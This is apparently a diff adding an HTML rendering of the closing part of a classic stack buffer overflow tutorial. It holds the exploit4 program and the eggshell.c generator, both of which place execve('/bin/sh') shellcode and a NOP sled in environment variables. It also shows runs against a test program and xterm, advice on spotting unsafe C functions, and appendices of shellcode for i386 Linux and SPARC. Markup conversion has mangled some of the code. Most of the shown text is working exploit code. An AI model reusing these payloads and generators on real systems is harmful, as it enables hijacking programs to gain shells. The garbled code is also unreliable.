+#define DEFAULT<sub>EGG</sub><sub>SIZE</sub>               2048
+#define NOP                            0x90
+</p>
+
+<p>
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+</p>
+
+<p>
+unsigned long get<sub>esp</sub>(void) {
+   _<sub>asm</sub>_<sub>("movl %esp,%eax")</sub>;
+}
+</p>
+
+<p>
+void main(int argc, char *argv[]) {
+  char *buff, *ptr, *egg;
+  long *addr<sub>ptr</sub>, addr;
+  int offset=DEFAULT<sub>OFFSET</sub>, bsize=DEFAULT<sub>BUFFER</sub><sub>SIZE</sub>;
+  int i, eggsize=DEFAULT<sub>EGG</sub><sub>SIZE</sub>;
+</p>
+
+<p>
+if (argc &gt; 1) bsize   = atoi(argv[1]);
+if (argc &gt; 2) offset  = atoi(argv[2]);
+if (argc &gt; 3) eggsize = atoi(argv[3]);
+</p>
+
+
+<p>
+if (!(buff = malloc(bsize))) {
+  printf("Can't allocate memory.\n");
+  exit(0);
+}
+if (!(egg = malloc(eggsize))) {
+  printf("Can't allocate memory.\n");
+  exit(0);
+}
+</p>
+
+<p>
+addr = get<sub>esp</sub>() - offset;
+printf("Using address: 0x%x\n", addr);
+</p>
+
+<p>
+ptr = buff;
+addr<sub>ptr</sub> = (long *) ptr;
+for (i = 0; i &lt; bsize; i+=4)
+  *(addr<sub>ptr</sub>++) = addr;
+</p>
+
+<p>
+ptr = egg;
+for (i = 0; i &lt; eggsize - strlen(shellcode) - 1; i++)
+  *(ptr++) = NOP;
+</p>
+
+<p>
+for (i = 0; i &lt; strlen(shellcode); i++)
+  *(ptr++) = shellcode[i];
+</p>
+
+<p>
+buff[bsize - 1] = '\0';
+egg[eggsize - 1] = '\0';
+</p>
+
+<p>
+  memcpy(egg,"EGG=",4);
+  putenv(egg);
+  memcpy(buff,"RET=",4);
+  putenv(buff);
+  system("/bin/bash");
+}
+</p>
+<hr />
+
+<p>
+Lets try our new exploit with our vulnerable test program:
+</p>
+
+<hr />
+<p>
+[aleph1]$ ./exploit4 768
+Using address: 0xbffffdb0
+[aleph1]$ ./vulnerable $RET
+$
+</p>
+<hr />
+
+<p>
+Works like a charm. Now lets try it on xterm:
+</p>
+
+<hr />
+<p>
+[aleph1]$ export DISPLAY=:0.0
+[aleph1]$ ./exploit4 2148
+Using address: 0xbffffdb0
+[aleph1]$ /usr/X11R6/bin/xterm -fg $RET
+Warning: Color name
+</p>
+
+<p>
+&#x2026;&#x2026;
+</p>
+
+<p>
+Warning: some arguments in previous message were lost
+$
+</p>
+<hr />
+
+<p>
+   On the first try!  It has certainly increased our odds.  Depending how 
+much environment data the exploit program has compared with the program 
+you are trying to exploit the guessed address may be to low or to high. 
+Experiment both with positive and negative offsets.
+</p>
+
+
+<p>
+Finding Buffer Overflows
+<code>~~~~~~~~~~~~~~~~~~~~~~</code>
+</p>
+
+<p>
+   As stated earlier, buffer overflows are the result of stuffing more
+information into a buffer than it is meant to hold.  Since C does not have any
+built-in bounds checking, overflows often manifest themselves as writing past
+the end of a character array.  The standard C library provides a number of
+functions for copying or appending strings, that perform no boundary checking.
+They include: strcat(), strcpy(), sprintf(), and vsprintf(). These functions 
+operate on null-terminated strings, and do not check for overflow of the 
+receiving string.  gets() is a function that reads a line from stdin into 
+a buffer until either a terminating newline or EOF.  It performs no checks for
+buffer overflows.  The scanf() family of functions can also be a problem if 
+you are matching a sequence of non-white-space characters (%s), or matching a 
+non-empty sequence of characters from a specified set (%[]), and the array 
+pointed to by the char pointer, is not large enough to accept the whole 
+sequence of characters, and you have not defined the optional maximum field 
+width.  If the target of any of these functions is a buffer of static size, 
+and its other argument was somehow derived from user input there is a good
+posibility that you might be able to exploit a buffer overflow.
+</p>
+
+<p>
+   Another usual programming construct we find is the use of a while loop to
+read one character at a time into a buffer from stdin or some file until the
+end of line, end of file, or some other delimiter is reached.  This type of
+construct usually uses one of these functions: getc(), fgetc(), or getchar().
+If there is no explicit checks for overflows in the while loop, such programs 
+are easily exploited.
+</p>
+
+<p>
+   To conclude, grep(1) is your friend.  The sources for free operating
+systems and their utilities is readily available.  This fact becomes quite
+interesting once you realize that many comercial operating systems utilities
+where derived from the same sources as the free ones.  Use the source d00d.
+</p>
+
+
+<p>
+Appendix A - Shellcode for Different Operating Systems/Architectures
+<code>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</code>
+</p>
+
+<p>
+i386/Linux
+</p>
+<hr />
+<p>
+	jmp    0x1f
+	popl   %esi
+	movl   %esi,0x8(%esi)
+	xorl   %eax,%eax
+movb   %eax,0x7(%esi)
+	movl   %eax,0xc(%esi)
+	movb   $0xb,%al
+	movl   %esi,%ebx
+	leal   0x8(%esi),%ecx
+	leal   0xc(%esi),%edx
+	int    $0x80
+	xorl   %ebx,%ebx
+	movl   %ebx,%eax
+	inc    %eax
+	int    $0x80
+	call   -0x24
+	.string \"/bin/sh\"
+</p>
+<hr />
+
+<p>
+SPARC/Solaris
+</p>
+<hr />
+<p>
+sethi   0xbd89a, %l6
+or      %l6, 0x16e, %l6
+sethi   0xbdcda, %l7
+and     %sp, %sp, %o0
+add     %sp, 8, %o1
+xor     %o2, %o2, %o2
+add     %sp, 16, %sp
+std     %l6, [%sp - 16]
+st      %sp, [%sp - 8]
+st      %g0, [%sp - 4]
+mov     0x3b, %g1
+ta      8
+xor     %o7, %o7, %o0
+mov     1, %g1
+ta      8
+</p>
+<hr />
+
+<p>
+SPARC/SunOS
+</p>
+<hr />
+<p>
+	sethi   0xbd89a, %l6
+	or      %l6, 0x16e, %l6
+	sethi   0xbdcda, %l7
+	and     %sp, %sp, %o0
+	add     %sp, 8, %o1
+	xor     %o2, %o2, %o2
+	add     %sp, 16, %sp
+	std     %l6, [%sp - 16]
+	st      %sp, [%sp - 8]
+	st      %g0, [%sp - 4]
+	mov     0x3b, %g1
+mov	-0x1, %l5
+	ta      %l5 + 1
+	xor     %o7, %o7, %o0
+	mov     1, %g1
+	ta      %l5 + 1
+</p>
+<hr />
+
+
+<p>
+Appendix B - Generic Buffer Overflow Program
+<code>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</code>
+</p>
+
+<p>
+shellcode.h
+</p>
+<hr />
+<p>
+#if defined(<span class="underline"><span class="underline">i386</span></span>) &amp;&amp; defined(<span class="underline"><span class="underline">linux</span></span>)
+</p>
+
+<p>
+#define NOP<sub>SIZE</sub> 1
+char nop[] = "\x90";
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+</p>
+
+<p>
+unsigned long get<sub>sp</sub>(void) {
+   _<sub>asm</sub>_<sub>("movl %esp,%eax")</sub>;
+}
+</p>
+
+<p>
+#elif defined(<span class="underline"><span class="underline">sparc</span></span>) &amp;&amp; defined(<span class="underline"><span class="underline">sun</span></span>) &amp;&amp; defined(<span class="underline"><span class="underline">svr4</span></span>)
+</p>
+
+<p>
+#define NOP<sub>SIZE</sub> 4
+char nop[]="\xac\x15\xa1\x6e";
+char shellcode[] =
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
+  "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";
+</p>
+
+<p>
+unsigned long get<sub>sp</sub>(void) {
+  _<sub>asm</sub>_<sub>("or %sp, %sp, %i0")</sub>;
+}
+</p>
+
+<p>
+#elif defined(<span class="underline"><span class="underline">sparc</span></span>) &amp;&amp; defined(<span class="underline"><span class="underline">sun</span></span>)
+</p>
+
+<p>
+#define NOP<sub>SIZE</sub>        4
+char nop[]="\xac\x15\xa1\x6e";
+char shellcode[] =
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"
+  "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";
+</p>
+
+<p>
+unsigned long get<sub>sp</sub>(void) {
+  _<sub>asm</sub>_<sub>("or %sp, %sp, %i0")</sub>;
+}
+</p>
+
+<p>
+#endif
+</p>
+<hr />
+
+<p>
+eggshell.c
+</p>
+<hr />
+<p>
+/*
+</p>
+<ul class="org-ul">
+<li>eggshell v1.0</li>
+<li></li>
+
+<li>Aleph One / aleph1@underground.org</li>
+</ul>
+<p>
+ */
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include "shellcode.h"
+</p>
+
+<p>
+#define DEFAULT<sub>OFFSET</sub>                    0
+#define DEFAULT<sub>BUFFER</sub><sub>SIZE</sub>             512
+#define DEFAULT<sub>EGG</sub><sub>SIZE</sub>               2048
+</p>
+
+<p>
+void usage(void);
+</p>
+
+<p>
+void main(int argc, char *argv[]) {
+  char *ptr, *bof, *egg;
+  long *addr<sub>ptr</sub>, addr;
+  int offset=DEFAULT<sub>OFFSET</sub>, bsize=DEFAULT<sub>BUFFER</sub><sub>SIZE</sub>;
+  int i, n, m, c, align=0, eggsize=DEFAULT<sub>EGG</sub><sub>SIZE</sub>;
+</p>
+
+<p>
+while ((c = getopt(argc, argv, "a:b:e:o:")) != EOF)
+  switch (c) {
+	case 'a':
+	  align = atoi(optarg);
+	  break;
+	case 'b':
+	  bsize = atoi(optarg);
+	  break;
+	case 'e':
+	  eggsize = atoi(optarg);
+	  break;
+	case 'o':
+	  offset = atoi(optarg);
+	  break;
+	case '?':
+	  usage();
+	  exit(0);
+  }
+</p>
+
+<p>
+if (strlen(shellcode) &gt; eggsize) {
+  printf("Shellcode is larger the the egg.\n");
+  exit(0);
+}
+</p>
+
+<p>
+if (!(bof = malloc(bsize))) {
+  printf("Can't allocate memory.\n");
+  exit(0);
+}
+if (!(egg = malloc(eggsize))) {
+  printf("Can't allocate memory.\n");
+  exit(0);
+}
+</p>
+
+<p>
+addr = get<sub>sp</sub>() - offset;
+printf("[ Buffer size:\t%d\t\tEgg size:\t%d\tAligment:\t%d\t]\n",
+  bsize, eggsize, align);
+printf("[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n", addr, offset);
+</p>
+
+<p>
+addr<sub>ptr</sub> = (long *) bof;
+for (i = 0; i &lt; bsize; i+=4)
+  *(addr<sub>ptr</sub>++) = addr;
+</p>
+
+<p>
+ptr = egg;
+for (i = 0; i &lt;= eggsize - strlen(shellcode) - NOP<sub>SIZE</sub>; i <del>= NOP<sub>SIZE</sub>)
+  for (n = 0; n &lt; NOP<sub>SIZE</sub>; n+</del>) {
+	m = (n + align) % NOP<sub>SIZE</sub>;
+	*(ptr++) = nop[m];
+  }
+</p>
+
+<p>
+for (i = 0; i &lt; strlen(shellcode); i++)
+  *(ptr++) = shellcode[i];
+</p>
+
+<p>
+bof[bsize - 1] = '\0';
+egg[eggsize - 1] = '\0';
+</p>
+
+<p>
+memcpy(egg,"EGG=",4);
+putenv(egg);
+</p>
+
+<p>
+  memcpy(bof,"BOF=",4);
+  putenv(bof);
+  system("/bin/sh");
+}
+</p>
+
+<p>
+void usage(void) {
+  (void)fprintf(stderr,
+    "usage: eggshell [-a &lt;alignment&gt;] [-b &lt;buffersize&gt;] [-e &lt;eggsize&gt;] [-o &lt;offset&gt;]\n");
+}
+</p>
+</div>
+</body>
+</html>
